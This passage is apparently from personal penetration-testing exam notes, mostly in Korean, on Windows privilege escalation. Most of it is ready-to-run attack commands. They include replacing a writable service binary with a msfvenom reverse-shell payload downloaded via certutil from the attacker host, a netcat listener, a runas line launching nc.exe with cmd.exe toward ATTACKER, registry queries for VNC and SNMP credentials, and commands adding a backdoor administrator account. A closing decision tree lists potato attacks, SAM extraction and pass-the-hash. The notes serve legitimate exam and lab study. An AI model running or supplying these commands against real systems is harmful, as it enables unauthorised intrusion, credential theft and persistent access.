Apache Server ["C:\xampp\apache\bin\httpd.exe" -k runservice] - Autoload
File Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
```

의미: 서비스 바이너리를 교체할 수 있고, 서비스가 재시작되면 내 코드가 서비스 계정(보통 SYSTEM)으로 실행된다.

```powershell
# Step 1: Find the exact service name
Get-Service | Where-Object {$_.DisplayName -like '*apache*'}
# Or: sc.exe query type= service state= all | findstr /i "apache"

# Step 2: Check WHO the service runs as
sc.exe qc Apache2.4
# Look for SERVICE_START_NAME: LocalSystem = SYSTEM = jackpot
# Also check START_TYPE: AUTO_START means it restarts on reboot too

# Step 3: Backup the original binary
move "C:\xampp\apache\bin\httpd.exe" "C:\xampp\apache\bin\httpd.exe.bak"

# Step 4: Generate your payload ON KALI (must be an exe that connects back)
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o httpd.exe
# Or use adduser.exe if reverse shell fails:
# x86_64-w64-mingw32-gcc adduser.c -o httpd.exe

# Step 5: Upload payload with the SAME NAME as the original binary
upload httpd.exe C:\xampp\apache\bin\httpd.exe
# Or: certutil -urlcache -f http://KALI/httpd.exe C:\xampp\apache\bin\httpd.exe

# Step 6: Start listener on Kali
# rlwrap nc -lvnp 443

# Step 7: Restart the service
sc.exe stop Apache2.4
sc.exe start Apache2.4
# If "Access Denied" on stop/start → wait for reboot (if AUTO_START)
# Or: shutdown /r /t 0 (if you have SeShutdownPrivilege)
```

흔한 실수:

- 서비스 이름에 `.exe` 붙이기 — `sc.exe qc auditTracker` 가 맞다, `sc.exe qc auditTracker.exe` 가 아니다. 서비스 NAME과 FILENAME은 다른 것이다. `sc.exe` 명령에서 `.exe` 실수 = 즉시 실패.
- `svc` 대신 `sc.exe` 사용 — `svc` 는 존재하지 않는다. 항상 `sc.exe`.
- nc.exe를 httpd.exe로 이름만 바꾸기 — 안 된다. nc.exe는 인자(-e cmd.exe)가 필요하다. msfvenom을 쓴다.
- 서비스 재시작 전 리스너 시작 잊기
- 서비스 이름 오류 — `Get-Service` 로 정확한 이름을 찾는다

서비스 stop/start가 access denied이고 재부팅도 access denied일 때:

```powershell
# Check if service auto-restarts on failure
sc.exe qfailure auditTracker
# If RESTART is listed as a failure action → the service will restart itself
# Your msfvenom binary will crash (it's not a real service) → triggers auto-restart → shell
# Just wait 1-2 minutes after uploading your payload

# Alternative: check if the service is currently running
sc.exe query auditTracker
# If STOPPED → you might be able to start it even without admin
sc.exe start auditTracker
```

Get-CimInstance가 access denied일 때 (admin 아님):

```powershell
# Broad registry search — works without admin, finds services + tasks + autorun
reg query HKLM /s /f "binaryname" 2>$null
# If it appears under HKLM\SYSTEM\CurrentControlSet\Services\ → it's a service
# Then use sc.exe qc SERVICENAME to check who runs it
```

- 참고: 같은 기법이 Apache가 아니라 임의의 쓰기 가능한 서비스 바이너리에 동작한다. WinPEAS는 이를 `File Permissions: ... [Allow: WriteData]` 또는 `[AllAccess]` 로 표시한다.

### 서비스 설정 상세 (sc qc)

```powershell
:: Get full config of a service
sc qc <servicename>
:: Shows: BINARY_PATH_NAME, SERVICE_START_NAME (who it runs as), START_TYPE
:: If BINARY_PATH_NAME is writable and SERVICE_START_NAME is LocalSystem → game over
```

### 추가 credential 위치 (구 eCPPT 노트)

```powershell
:: VNC passwords (encrypted but crackable)
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKCU\Software\TightVNC\Server" 2>nul

:: SNMP community strings
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 2>nul

:: IIS .NET Framework config (another web.config location)
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul
```

```powershell
# PS equivalents:
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>$null
reg query "HKCU\Software\TightVNC\Server" 2>$null
Get-Content C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config -EA SilentlyContinue
```

### 추가 자동 도구

```powershell
:: Beyond WinPEAS and PowerUp:
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
.\Jaws-enum.ps1
```

### 유저 추가 (영속성 / 안정 접근이 필요할 때)

```powershell
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
net localgroup "Remote Management Users" hacker /add
```

- 기억: 새 그룹 멤버십은 새 세션에서만 적용된다.

### Pass the Hash — Windows에서

- `pth-winexe` — Kali에서 pass-the-hash로 쉘 획득

### 빠른 참조 — 항상 확인할 위치

```text
C:\Users\<user>\Desktop\          ← flags, notes, shortcuts
C:\Users\<user>\Documents\        ← interesting files
C:\Users\<user>\Downloads\        ← downloaded tools/creds
C:\Users\<user>\AppData\          ← HIDDEN! Use -Force or full path
C:\xampp\                         ← web configs, passwords.txt
C:\inetpub\wwwroot\              ← IIS web root, web.config
C:\Windows\repair\               ← SAM backups
C:\Windows\System32\config\      ← SAM, SYSTEM, SECURITY
C:\windows.old\                  ← OLD OS files (creds from previous install!)
C:\ProgramData\                  ← app data, startup items
C:\Program Files\                ← installed software (searchsploit versions)
```

### 빠른 의사결정 트리 — Windows PrivEsc

```text
whoami /priv shows SeImpersonatePrivilege →
└── Potato attack (PrintSpoofer → GodPotato → JuicyPotatoNG)

Found a writable service binary →
└── Replace with reverse shell → restart service

Found unquoted service path with writable dir →
└── Place payload in writable directory → restart service

Found saved credentials (cmdkey /list) →
└── runas /savecred /user:admin C:\Windows\Temp\nc.exe ATTACKER 443 -e cmd.exe

Found readable SAM/SYSTEM →
└── Extract → secretsdump → pass the hash

Found auto-login in registry →
└── Use those creds on RDP, WinRM, SMB

Found cleartext password in config/history/AppData →
└── Try on all services, try on all machines (reuse!)

Found writable scheduled task →
└── Inject payload → wait for execution

Found AlwaysInstallElevated = 1 →
└── msfvenom MSI payload → msiexec

Medium integrity + local admin →
└── UAC bypass (fodhelper)

Nothing obvious from manual checks →
└── Run WinPEAS → focus on red/yellow highlights
└── Run Hidden AppData search → check for saved creds
└── Check running processes for custom apps → searchsploit
```
